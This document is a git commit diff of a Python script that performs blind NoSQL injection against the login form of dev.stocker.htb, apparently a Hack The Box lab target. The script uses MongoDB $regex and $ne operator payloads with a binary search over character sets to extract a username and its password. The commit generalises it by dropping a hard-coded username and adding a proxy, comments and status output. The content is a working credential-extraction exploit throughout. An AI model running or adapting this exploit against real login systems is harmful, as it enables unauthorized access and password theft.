9db410df5e1929034948f347fd3ff634b179768a
whipped <github@kpax.uk>
2023-07-13 16:26:22 +0100

    Update dump-password.py
    Removed hard coded username
    Added code to determine if character exists in character set
    Comments and output formatting

--- nosql/dump-password.py
+++ nosql/dump-password.py
@@ -6,42 +6,61 @@ import requests
 import string
 
 def test_login(payload):    
+    proxies={"http":"http://127.0.0.1:8080"}
     url = 'http://dev.stocker.htb/login'
-    r = requests.post(url, json=payload)
+    r = requests.post(url, json=payload, proxies=proxies)
     r.raise_for_status()
     if "error" in r.text:
         return False
     return True      
 
-def get_char_password(username, startswith):
-    charset = "0123456789abcdef"
+def get_char_password(username, startswith, charset = string.ascii_letters + string.digits):
     while len(charset) > 1:
+        # Get the first half of the current charset
         guess = charset[:len(charset)//2]
         guess = "[" + guess + "]"
         payload = {
             "username":username,
             "password":{ "$regex":f"^{startswith}{guess}" }}
         if test_login(payload):
+            # Character is in first half
             charset = charset[:len(charset)//2]
         else:
+            # Character is possibly in second half
             charset = charset[len(charset)//2:]
+            if len(charset) == 1:
+                # Last possibe character, need to check it one last time
+                payload = {
+                    "username":username,
+                    "password":{ "$regex":f"^{startswith}{charset}" }}
+                if not test_login(payload):
+                    raise Exception("Exhausted Character Set")
     return charset
     #raise Exception("Unable to get char of username")
 
-def get_char_username(startswith):
-    charset = string.ascii_letters + string.digits
+def get_char_username(startswith, charset = string.ascii_letters + string.digits):
     while len(charset) > 1:
+        # Get the first half of the current charset
         guess = charset[:len(charset)//2]
         guess = "[" + guess + "]"
         payload = {
             "username":{ "$regex":f"^{startswith}{guess}" },
             "password":{"$ne":"admin"}}
         if test_login(payload):
+            # Character is in first half
             charset = charset[:len(charset)//2]
         else:
+            # Character is possibly in second half
             charset = charset[len(charset)//2:]
+            if len(charset) == 1:
+                # Last possibe character, need to check it one last time
+                payload = {
+                    "username":{ "$regex":f"^{startswith}{charset}" },
+                    "password":{"$ne":"admin"}}
+                if not test_login(payload):
+                    raise Exception("Exhausted Character Set")
     return charset
-    #raise Exception("Unable to get char of username")
+
 
 def get_password(username, length, startswith=""):
     try:
@@ -49,7 +68,6 @@ def get_password(username, length, startswith=""):
             char = get_char_password(username, startswith)
             if char:
                 startswith += char            
-                print(startswith)
         return startswith
     except Exception as e:
         raise e
@@ -66,7 +84,7 @@ def get_username(length, startswith=""):
 
 def get_length_username():
     try:
-        for i in range(1,4):
+        for i in range(1,50):
             payload = {
                 "username":{"$regex":f"^[a-zA-Z0-9]{{{i}}}$"},
                 "password":{"$ne":"admin"}}
@@ -76,11 +94,11 @@ def get_length_username():
     except Exception as e:
         raise e
     
-def get_length_password():
+def get_length_password(username):
     try:
         for i in range(1,128):
             payload = {
-                "username":"angoose",
+                "username":username,
                 "password":{"$regex":f"^[a-zA-Z0-9]{{{i}}}$"}}
             if test_login(payload):
                 return i
@@ -89,16 +107,24 @@ def get_length_password():
         raise e
 
 try:
-    length_password = get_length_password()
-    print("Angoose Password = 32 characters")
-    pw = get_password("angoose", length_password)
-    print("Angoose Password = " + pw)
-
-    # print(length_password)
+    # Get Username Length
+    print("[+] Locating Length of Username")
+    length_username = get_length_username()
+    print(f"[+] The username is {length_username} characters long")
+    # Get the username
+    print("[+] Locating Username")
+    username = get_username(length_username)
+    print(f"[+] The username is {username}")
     
+    # Get length of user's password
+    print("[+] Locating Length of Password")
+    length_password = get_length_password(username)
+    print(f"[+] {username} Password is {length_password} characters long")
+    
+    # Get the Password
+    print("[+] Locating Password")
+    pw = get_password(username, length_password)
+    print(f"[+] {username} Password is {pw}")
 
-    #length_username = get_length_username()
-    # length_username = 7
-    # get_username(length_username)
 except Exception as e:
     print(e)
